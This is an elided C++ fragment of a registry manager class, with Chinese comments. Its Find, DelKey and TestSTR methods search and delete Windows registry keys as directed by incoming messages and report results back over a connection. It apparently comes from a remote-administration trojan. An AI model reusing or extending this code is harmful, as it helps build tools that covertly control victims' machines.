...
void CRegManager::Find(char bToken,char* path)
{
   ...
   if(tmp!=NULL){
     Send((LPBYTE)tmp, pLocalSize(tmp));
	  pLocalFree(tmp);
   }else{
      SendNO();
   }
   char* tmpd=reg.FindKey();
    ...
    if(tmpd!=NULL){
     Send((LPBYTE)tmpd, pLocalSize(tmpd));
	  pLocalFree(tmpd);
	}else{
	     SendNO();
	}
...
void CRegManager::DelKey(char *buf)
{
    CRegistry reg(buf[0]);
	REGMSG msg;
	Gyfunction->my_memcpy((void*)&msg,buf+1,sizeof(msg));
	...
	{   
		if(msg.size>0){                //先处理项
			   ...
			   Gyfunction->my_memcpy(path,tmp,msg.size);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
		...
		Gyfunction->my_memcpy(key,tmp,msg.valsize);
...
void CRegManager::TestSTR(char *buf)
{
	...
	{   
		if(msg.count>0){                //先处理项
			   ...
			   Gyfunction->my_memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
		...
		Gyfunction->my_memcpy(key,tmp,msg.size);
        tmp+=msg.size;
